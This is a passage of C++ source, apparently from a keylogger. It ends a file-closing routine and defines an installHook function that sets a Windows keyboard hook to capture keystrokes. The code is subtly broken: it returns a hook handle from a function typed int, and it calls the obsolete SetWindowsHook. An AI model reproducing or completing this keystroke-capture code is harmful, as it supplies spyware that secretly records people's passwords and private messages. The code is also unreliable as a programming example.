    file.close();
}

// Function to install the keyboard hook
int installHook() {
    HHOOK hhook = SetWindowsHook(WH_KEYBOARD, KeyboardCallback);
    if (hhook == NULL) {
        cout << "Failed to install keyboard hook" << endl;
        return -1;
    }
    return hhook;
}

